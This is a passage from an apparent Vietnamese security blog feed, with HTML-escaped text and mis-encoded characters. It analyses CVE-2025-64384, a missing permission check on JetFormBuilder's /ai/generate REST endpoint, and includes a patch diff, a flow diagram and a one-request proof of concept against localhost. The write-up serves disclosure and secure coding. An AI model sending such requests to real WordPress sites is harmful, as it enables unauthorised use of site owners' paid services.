&lt;strong&gt;Incorrectly Configured Access Control Security Levels&lt;/strong&gt;. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;JetFormBuilder&lt;/strong&gt;: t·ª´ &lt;strong&gt;n/a&lt;/strong&gt; ƒë·∫øn &lt;strong&gt;&amp;lt;= 3.5.3&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-64384&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-64384&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.5.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.5.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/jetformbuilder/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress JetFormBuilder Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;JetFormBuilder&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.3&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.4&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Th·ª±c hi·ªán diff code:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-09-cve-2025-64384/diff.png&#34; title=&#34;S·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-12-09-cve-2025-64384/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;S·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-09-cve-2025-64384/diff.png&#39; alt=&#34;Diff&#34; height=&#34;820&#34; width=&#34;1535&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n l·ªói (v3.5.3):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;class &lt;code&gt;Generate_Form_Endpoint&lt;/code&gt; t·ªìn t·∫°i c√°c h√†m tr·∫£ v·ªÅ gi√° tr·ªã t∆∞∆°ng ·ª©ng v·ªõi c√°c tham s·ªë ƒë·ªÉ ƒëƒÉng k√Ω REST API trong WordPress&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;route: &lt;code&gt;/ai/generate&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;method: &lt;code&gt;POST&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;callback: &lt;code&gt;run_callback&lt;/code&gt; d√πng ƒë·ªÉ t·∫°o form b·∫±ng AI v·ªõi c√≥ gi·ªõi h·∫°n (15 request / month)&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-09-cve-2025-64384/ai.png&#34; title=&#34;T·∫°o form v·ªõi AI&#34; data-thumbnail=&#34;/posts/2025-12-09-cve-2025-64384/ai.png&#34; data-sub-html=&#34;&lt;h2&gt;AI&lt;/h2&gt;&lt;p&gt;T·∫°o form v·ªõi AI&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-09-cve-2025-64384/ai.png&#39; alt=&#34;AI&#34; height=&#34;875&#34; width=&#34;1026&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;T·∫°o form v·ªõi AI&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;ƒê√¢y l√† h√†m d√πng ƒë·ªÉ ƒëƒÉng k√Ω m·ªôt endpoint m·ªõi cho REST API. C·∫•u tr√∫c c∆° b·∫£n nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route( &#xA;    string $namespace, &#xA;    string $route, &#xA;    array  $args = array(), &#xA;    bool   $override = false &#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$namespace&lt;/code&gt;: Kh√¥ng gian t√™n cho route, th∆∞·ªùng l√† t√™n plugin ho·∫∑c module.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;V√≠ d·ª•: &amp;quot;myplugin/v1&amp;quot;&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;p&gt;&lt;code&gt;$route&lt;/code&gt;: ƒê∆∞·ªùng d·∫´n c·ªßa endpoint (sau namespace).&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;V√≠ d·ª•: &amp;quot;/items&amp;quot;&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;p&gt;&lt;code&gt;$args&lt;/code&gt;: M·∫£ng c·∫•u h√¨nh cho route, g·ªìm:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;methods&lt;/code&gt;: Ph∆∞∆°ng th·ª©c HTTP (GET, POST, PUT, DELETE&amp;hellip;).&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;callback&lt;/code&gt;: H√†m x·ª≠ l√Ω khi endpoint ƒë∆∞·ª£c g·ªçi.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;permission_callback&lt;/code&gt;: H√†m ki·ªÉm tra quy·ªÅn truy c·∫≠p.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;args&lt;/code&gt;: (tu·ª≥ ch·ªçn) C√°c tham s·ªë truy·ªÅn v√†o endpoint.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;$override&lt;/code&gt;: M·∫∑c ƒë·ªãnh &lt;code&gt;false&lt;/code&gt;. N·∫øu &lt;code&gt;true&lt;/code&gt;, s·∫Ω ghi ƒë√® route ƒë√£ t·ªìn t·∫°i.&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªëi chi·∫øu v·ªõi c√°c h√†m trong class &lt;code&gt;Generate_Form_Endpoint&lt;/code&gt;, ta th·∫•y API n·∫øu ƒë∆∞·ª£c ƒëƒÉng k√Ω s·∫Ω thi·∫øu th√†nh ph·∫ßn &lt;code&gt;permission_callback&lt;/code&gt; ƒë·ªÉ ki·ªÉm tra quy·ªÅn truy c·∫≠p, khi·∫øn cho t·∫•t c·∫£ user (k·ªÉ c√°c Unauthenticated) c√≥ th·ªÉ g·ªçi ƒë·∫øn endpoint n√†y, s·ª≠ d·ª•ng ch·ª©c nƒÉng t·∫°o form b·∫±ng AI m·ªôt c√°ch tu·ª≥ √Ω.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v3.5.4):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Generate_Form_Endpoint extends Rest_Api_Private_Endpoint_Base&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Gi√°n ti·∫øp k·∫ø th·ª´a &lt;code&gt;Rest_Api_Endpoint_Base&lt;/code&gt; th√¥ng quan vi·ªác k·∫ø th·ª´a &lt;code&gt;Rest_Api_Private_Endpoint_Base&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;abstract class Rest_Api_Private_Endpoint_Base extends Rest_Api_Endpoint_Base {&#xA;&#x9;public function check_permission(): bool {&#xA;&#x9;&#x9;return current_user_can( &amp;#39;edit_jet_fb_forms&amp;#39; ); // just for admin&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;check_permission&lt;/code&gt; ƒë∆∞·ª£c t·∫°o ƒë·ªÉ ghi ƒë√® l·∫°i &lt;code&gt;check_permission&lt;/code&gt; c·ªßa &lt;code&gt;Rest_Api_Endpoint_Base&lt;/code&gt;, x√°c ƒë·ªãnh r·∫±ng n√≥ ch·ªâ d√†nh cho admin.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;abstract class Rest_Api_Endpoint_Base implements Rest_Fetch_Endpoint {&#xA;    public function check_permission(): bool {&#xA;&#x9;&#x9;return true; // permission_callback: true&#xA;&#x9;}&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;&#xA;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;rest_api_init&amp;#39;, array( $this, &amp;#39;register_routes&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;rest_api_init&lt;/code&gt;: Hook n√†y ƒë∆∞·ª£c g·ªçi khi WordPress kh·ªüi t·∫°o &lt;strong&gt;REST API&lt;/strong&gt;, khi ƒë√≥ callback &lt;code&gt;register_routes&lt;/code&gt; ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function register_routes() {&#xA;    foreach ( $this-&amp;gt;routes() as $route ) {&#xA;        $endpoint_args = $route-&amp;gt;get_overridden_args()&#xA;            ?: array( // phpcs:ignore Universal.Operators.DisallowShortTernary.Found&#xA;                &amp;#39;methods&amp;#39;             =&amp;gt; $route::get_methods(),&#xA;                &amp;#39;callback&amp;#39;            =&amp;gt; array( $route, &amp;#39;run_callback&amp;#39; ),&#xA;                &amp;#39;permission_callback&amp;#39; =&amp;gt; array( $route, &amp;#39;check_permission&amp;#39; ),&#xA;                &amp;#39;args&amp;#39;                =&amp;gt; $route-&amp;gt;get_common_args(),&#xA;            );&#xA;&#xA;        $result = register_rest_route(&#xA;            $route::get_namespace(), // jet-form-builder/v1/&#xA;            &amp;#34;/{$route::get_rest_base()}&amp;#34;,&#xA;            $endpoint_args,&#xA;            $route-&amp;gt;get_override()&#xA;        );&#xA;&#xA;        if ( ! $result ) {&#xA;            _doing_it_wrong(&#xA;                __METHOD__,&#xA;                // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped&#xA;                &amp;#34;Error on register REST API route: {$route::get_namespace()}/{$route::get_rest_base()}&amp;#34;,&#xA;                &amp;#39;1.4.0&amp;#39;&#xA;            );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;register_routes&lt;/code&gt; s·∫Ω duy·ªát qua c√°c route v√† g·ªçi ƒë·∫øn &lt;code&gt;register_rest_route&lt;/code&gt; ƒë·ªÉ ƒëƒÉng k√Ω API, trong ƒë√≥ &lt;code&gt;$this-&amp;gt;routes()&lt;/code&gt; l√† c√°c route ƒë∆∞·ª£c ƒëƒÉng k√Ω b·∫±ng 2 c√°ch:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;K·∫ø th·ª´a &lt;code&gt;Rest_Api_Controller_Base&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Controller extends Rest_Api_Controller_Base {&#xA;    protected $routes = array();&#xA;    public function __construct() {&#xA;        $this-&amp;gt;routes = array(&#xA;            new Get_Form_Fields(),&#xA;            new Install_Migrations_Endpoint(),&#xA;        );&#xA;    }&#xA;&#xA;    public function routes(): array {&#xA;        return $this-&amp;gt;routes;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;G·ªçi ƒë·∫øn:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$rest_api-&amp;gt;get_controller()-&amp;gt;install( new Generate_Form_Endpoint() );&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Attacker (Unauthenticated user)&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Send POST request to /wp-json/jet-form-builder/v1/ai/generate&amp;#34;]&#xA;--&amp;gt; C[&amp;#34;WordPress REST API receives request&amp;#34;]&#xA;--&amp;gt; D[&amp;#34;JetFormBuilder register_routes() is triggered via rest_api_init&amp;#34;]&#xA;--&amp;gt; E[&amp;#34;Generate_Form_Endpoint registered with: methods: POST callback: run_callback permission_callback: true (default)&amp;#34;]&#xA;--&amp;gt; F{&amp;#34;Is permission_callback properly defined?&amp;#34;}&#xA;F -- No (&amp;lt;=3.5.3) --&amp;gt; G[&amp;#34;Access granted to all users&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;run_callback executed ‚Üí AI form generation&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;Attacker bypasses intended restriction (15 requests/month)&amp;#34;]&#xA;F -- Yes (&amp;gt;=3.5.4) --&amp;gt; J[&amp;#34;check_permission() requires current_user_can(&amp;#39;edit_jet_fb_forms&amp;#39;)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Only Admin can access ‚Üí Exploit prevented&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;G·ª≠i request v·ªõi Unauthenticated user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/jet-form-builder/v1/ai/generate HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;prompt=create malicious form submit&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-09-cve-2025-64384/resp.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-12-09-cve-2025-64384/resp.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-09-cve-2025-64384/resp.png&#39; alt=&#34;Result&#34; height=&#34;600&#34; width=&#34;1492&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-64384 xu·∫•t ph√°t t·ª´ vi·ªác &lt;strong&gt;thi·∫øu &lt;code&gt;permission_callback&lt;/code&gt;&lt;/strong&gt; cho REST API &lt;code&gt;/ai/generate&lt;/code&gt; trong JetFormBuilder &amp;lt;= 3.5.3, cho ph√©p ng∆∞·ªùi d√πng &lt;strong&gt;kh√¥ng x√°c th·ª±c&lt;/strong&gt; g·ªçi endpoint v√† l·∫°m d·ª•ng t√≠nh nƒÉng t·∫°o form b·∫±ng AI. B·∫£n v√° 3.5.4 ƒë√£ bu·ªôc ki·ªÉm tra quy·ªÅn b·∫±ng &lt;code&gt;current_user_can(&#39;edit_jet_fb_forms&#39;)&lt;/code&gt;, gi·ªõi h·∫°n truy c·∫≠p ch·ªâ cho admin v√† lo·∫°i b·ªè kh·∫£ nƒÉng khai th√°c.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Lu√¥n khai b√°o &lt;code&gt;permission_callback&lt;/code&gt; khi ƒëƒÉng k√Ω REST API.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng d·ª±a v√†o gi·ªõi h·∫°n logic n·∫øu ch∆∞a c√≥ ki·ªÉm so√°t quy·ªÅn truy c·∫≠p.&lt;/li&gt;&#xA;&lt;li&gt;K·∫ø th·ª´a ƒë√∫ng base class c√≥ th·ªÉ ngƒÉn l·ªói b·∫£o m·∫≠t nghi√™m tr·ªçng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/jetformbuilder/vulnerability/wordpress-jetformbuilder-plugin-3-5-3-broken-access-control-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress JetFormBuilder Plugin &amp;lt;= 3.5.3 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-12887 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-08-cve-2025-12887/</link>
      <pubDate>Mon, 08 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-08-cve-2025-12887/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
